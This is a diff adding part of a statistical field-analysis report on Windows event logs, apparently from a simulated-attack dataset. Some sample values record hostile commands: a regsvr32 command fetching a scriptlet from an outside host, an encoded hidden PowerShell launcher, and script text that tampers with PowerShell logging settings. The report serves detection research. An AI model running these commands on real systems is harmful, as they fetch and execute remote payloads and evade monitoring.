+   Sample Values: S-1-0-0, S-1-5-18, S-1-5-21-2253742117-2054739524-205962475-1104
+
+104. Field: TargetUserName
+   Frequency: 24 events (1.0%)
+   Data Types: str
+   String Length: 1 - 13 characters
+   Description: Target user name
+   Sample Values: -, SYSTEM, WORKSTATION5$, MORDORDC$, pgustavo
+
+105. Field: TargetLogonId
+   Frequency: 24 events (1.0%)
+   Data Types: str
+   String Length: 3 - 9 characters
+   Description: Identifier field - likely used for correlation and tracking
+   Sample Values: 0x0, 0x3e7, 0x3e4, 0x565d702, 0x2457aa3
+
+106. Field: TargetDomainName
+   Frequency: 24 events (1.0%)
+   Data Types: str
+   String Length: 1 - 12 characters
+   Description: Target domain name
+   Sample Values: -, NT AUTHORITY, MORDOR, MORDOR.LOCAL
+
+107. Field: TargetFilename
+   Frequency: 20 events (0.8%)
+   Data Types: str
+   String Length: 43 - 169 characters
+   Description: Target filename for file operations
+   Sample Values: C:\Windows\ServiceState\EventLog\Data\lastalive0.dat, C:\Users\pgustavo\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\9SUGLJ70WBOMW3ROV62V.temp, C:\Users\pgustavo\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\590aee7bdd69b59b.customDestinations-ms~RFc191cb7.TMP, C:\Users\pgustavo\AppData\Local\Temp\__PSScriptPolicyTest_dfz15bah.1xr.ps1, C:\Users\pgustavo\AppData\Local\Temp\__PSScriptPolicyTest_jsb2zrvt.2f4.psm1
+
+108. Field: CreationUtcTime
+   Frequency: 17 events (0.7%)
+   Data Types: str
+   String Length: 23 - 23 characters
+   Description: File creation time
+   Sample Values: 2020-07-19 18:47:10.365, 2020-07-22 03:27:53.232, 2020-07-22 00:35:41.438, 2020-07-22 03:27:53.248, 2020-07-22 03:27:53.328
+
+109. Field: CommandLine
+   Frequency: 14 events (0.6%)
+   Data Types: str
+   String Length: 48 - 5213 characters
+   Description: Command line used to start the process
+   Sample Values: "C:\windows\system32\regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADc..., \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1, C:\windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost, C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding
+
+110. Field: DisabledPrivilegeList
+   Frequency: 11 events (0.5%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: List of disabled privileges
+   Sample Values: -
+
+111. Field: EnabledPrivilegeList
+   Frequency: 11 events (0.5%)
+   Data Types: str
+   String Length: 315 - 315 characters
+   Description: List of enabled privileges
+   Sample Values: SeAssignPrimaryTokenPrivilege SeIncreaseQuotaPrivilege SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeSystemtimePrivilege SeBackupPrivilege SeRestoreP...
+
+112. Field: LogonGuid
+   Frequency: 9 events (0.4%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Logon session identifier
+   Sample Values: {b59756a9-8990-5f17-a879-450200000000}, {00000000-0000-0000-0000-000000000000}, {b59756a9-9965-5f14-e703-000000000000}, {b59756a9-9966-5f14-e403-000000000000}, {1c000551-e588-2108-6ef3-8acb8f49a2bf}
+
+113. Field: ParentImage
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 31 - 57 characters
+   Description: Full path to the parent process executable
+   Sample Values: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\regsvr32.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe
+
+114. Field: TerminalSessionId
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Terminal session identifier
+   Sample Values: 3, 0
+
+115. Field: ParentCommandLine
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 32 - 5213 characters
+   Description: Command line of the parent process
+   Sample Values: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "C:\windows\system32\regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADc..., C:\windows\system32\services.exe, C:\windows\system32\svchost.exe -k DcomLaunch -p
+
+116. Field: IntegrityLevel
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 4 - 12 characters
+   Description: Process integrity level
+   Sample Values: High, System, AppContainer, Medium
+
+117. Field: ParentProcessId
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 3 - 4 characters
+   Description: Process ID of the parent process
+   Sample Values: 8648, 9384, 9076, 732, 920
+
+118. Field: LogonId
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 5 - 9 characters
+   Description: Logon session ID
+   Sample Values: 0x24579a8, 0x3e7, 0x3e4, 0x2457aa3
+
+119. Field: ParentProcessGuid
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 38 - 38 characters
+   Description: Globally unique identifier of the parent process
+   Sample Values: {b59756a9-89dc-5f17-1006-000000000400}, {b59756a9-b238-5f17-5207-000000000400}, {b59756a9-b239-5f17-5307-000000000400}, {b59756a9-9965-5f14-0b00-000000000400}, {b59756a9-9966-5f14-1000-000000000400}
+
+120. Field: CurrentDirectory
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 10 - 77 characters
+   Description: Current working directory of the process
+   Sample Values: C:\windows\system32\, C:\windows, C:\Windows\SystemApps\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\
+
+121. Field: NewProcessId
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Process ID of newly created process
+   Sample Values: 0x24a8, 0x2374, 0x12f8, 0x1a28, 0x2278
+
+122. Field: TokenElevationType
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Token elevation type
+   Sample Values: %%1937, %%1936, %%1938
+
+123. Field: ParentProcessName
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 31 - 57 characters
+   Description: Path to parent process
+   Sample Values: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\regsvr32.exe, C:\Windows\System32\services.exe, C:\Windows\System32\svchost.exe
+
+124. Field: NewProcessName
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 31 - 57 characters
+   Description: Path to newly created process
+   Sample Values: C:\Windows\System32\regsvr32.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\wbem\WmiPrvSE.exe
+
+125. Field: MandatoryLabel
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 11 - 12 characters
+   Description: Mandatory integrity label
+   Sample Values: S-1-16-12288, S-1-16-16384, S-1-16-4096, S-1-16-8192
+
+126. Field: Service
+   Frequency: 7 events (0.3%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Service name
+   Sample Values: -
+
+127. Field: PipeName
+   Frequency: 6 events (0.3%)
+   Data Types: str
+   String Length: 7 - 59 characters
+   Description: Named pipe name for inter-process communication
+   Sample Values: \srvsvc, \PSHost.132398620730657824.9076.DefaultAppDomain.powershell, \wkssvc
+
+128. Field: LogonType
+   Frequency: 6 events (0.3%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Type of logon
+   Sample Values: 5, 3
+
+129. Field: Device
+   Frequency: 4 events (0.2%)
+   Data Types: str
+   String Length: 23 - 23 characters
+   Description: Device name
+   Sample Values: \Device\HarddiskVolume2, \Device\HarddiskVolume1, \Device\HarddiskVolume3
+
+130. Field: MessageNumber
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Message number
+   Sample Values: 1
+
+131. Field: ScriptBlockId
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 36 - 36 characters
+   Description: PowerShell script block identifier
+   Sample Values: 285fc71a-1d15-482e-8122-177248f5d0ab, bad69931-ce9f-4cb1-acb0-22a018f347ac, 15ca6879-8a8b-40db-b137-45f954f98ebf
+
+132. Field: MessageTotal
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Total messages
+   Sample Values: 1
+
+133. Field: ScriptBlockText
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 6 - 1931 characters
+   Description: PowerShell script block content
+   Sample Values: .\regsvr32.exe /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll, prompt, IF($PSVErsIoNTaBLe.PSVERSIOn.MAJoR -Ge 3){$57af0=[reF].AsSEMBlY.GEtTyPe('System.Management.Automation.Utils')."GETFIe`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');If($57af0){$48ac6=$57Af0.GE...
+
+134. Field: IsExecutable
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 5 - 5 characters
+   Description: Executable file indicator
+   Sample Values: false
+
+135. Field: Archived
+   Frequency: 3 events (0.1%)
+   Data Types: str
+   String Length: 4 - 4 characters
+   Description: Archive status
+   Sample Values: true
+
+136. Field: Status
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 3 - 3 characters
+   Description: Operation status
+   Sample Values: 0x5, 0x1
+
+137. Field: PreviousCreationUtcTime
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 23 - 23 characters
+   Description: Previous creation time of registry key
+   Sample Values: 2020-07-22 03:27:53.232, 2020-07-22 03:28:26.650
+
+138. Field: TransmittedServices
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Transmitted services
+   Sample Values: -
+
+139. Field: ElevatedToken
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Elevated token indicator
+   Sample Values: %%1842
+
+140. Field: TargetOutboundUserName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Target outbound user name
+   Sample Values: -
+
+141. Field: RestrictedAdminMode
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Restricted admin mode indicator
+   Sample Values: -
+
+142. Field: LmPackageName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: LM package name
+   Sample Values: -
+
+143. Field: IpPort
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 5 characters
+   Description: IP port field
+   Sample Values: -, 64454
+
+144. Field: TargetOutboundDomainName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Target outbound domain name
+   Sample Values: -
+
+145. Field: TargetLinkedLogonId
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 3 - 3 characters
+   Description: Target linked logon ID
+   Sample Values: 0x0
+
+146. Field: AuthenticationPackageName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 8 - 9 characters
+   Description: Authentication package used
+   Sample Values: Negotiate, Kerberos
+
+147. Field: VirtualAccount
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Virtual account indicator
+   Sample Values: %%1843
+
+148. Field: LogonProcessName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 8 - 8 characters
+   Description: Logon process name
+   Sample Values: Advapi, Kerberos
+
+149. Field: ImpersonationLevel
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 6 - 6 characters
+   Description: Impersonation level
+   Sample Values: %%1833
+
+150. Field: IpAddress
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 3 characters
+   Description: IP address field
+   Sample Values: -, ::1
+
+151. Field: WorkstationName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Workstation name
+   Sample Values: -
+
+152. Field: KeyLength
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Key length
+   Sample Values: 0
+
+153. Field: EventCountTotal
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Total event count
+   Sample Values: 1
+
+154. Field: EventIdx
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: Event index
+   Sample Values: 1
+
+155. Field: GroupMembership
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 67 - 355 characters
+   Description: Group membership information
+   Sample Values: %{S-1-5-32-544} %{S-1-1-0} %{S-1-5-11} %{S-1-16-16384}, %{S-1-5-32-544} %{S-1-1-0} %{S-1-5-32-554} %{S-1-5-32-545} %{S-1-5-32-555} %{S-1-5-32-560} %{S-1-5-2} %{S-1-5-11} %{S-1-5-15} %{S-1-5-21-2253742117-2054739524-205962475-1000...
+
+156. Field: NewSd
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 94 - 98 characters
+   Description: New security descriptor
+   Sample Values: D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-80-3524758515-3090971750-345616940-2322499744-3530715838), D:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-615999462-62705297-2911207457-59056572-3668589837)
+
+157. Field: OldSd
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 26 - 30 characters
+   Description: Old security descriptor
+   Sample Values: D:(A;;GA;;;SY)(A;;RCGXGR;;;BA), D:(A;;GA;;;SY)(A;;GA;;;NS)
+
+158. Field: QueryStatus
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 1 - 1 characters
+   Description: WMI query status
+   Sample Values: 0
+
+159. Field: QueryResults
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 10 - 53 characters
+   Description: WMI query results
+   Sample Values: 127.0.0.1;, type: 5 arc.msn.com.nsatc.net;::ffff:52.167.250.154;
+
+160. Field: QueryName
+   Frequency: 2 events (0.1%)
+   Data Types: str
+   String Length: 9 - 11 characters
+   Description: WMI query name
+   Sample Values: localhost, arc.msn.com
+
+161. Field: param2
+   Frequency: 1 events (0.0%)
+   Data Types: str
+   String Length: 16 - 16 characters
+   Description: Parameter 2
+   Sample Values: DefaultAppDomain
+
+162. Field: param1
+   Frequency: 1 events (0.0%)
+   Data Types: str
+   String Length: 4 - 4 characters
+   Description: Parameter 1
+   Sample Values: 9076
+
+====================================================================================================
+FIELD ANALYSIS SUMMARY
+====================================================================================================
+Total Fields Analyzed: 162
+Events Processed: 2,390
+Most Frequent Field: Task (2,390 occurrences)
+Least Frequent Field: param1 (1 occurrences)
+====================================================================================================
+END OF ANALYSIS
+====================================================================================================
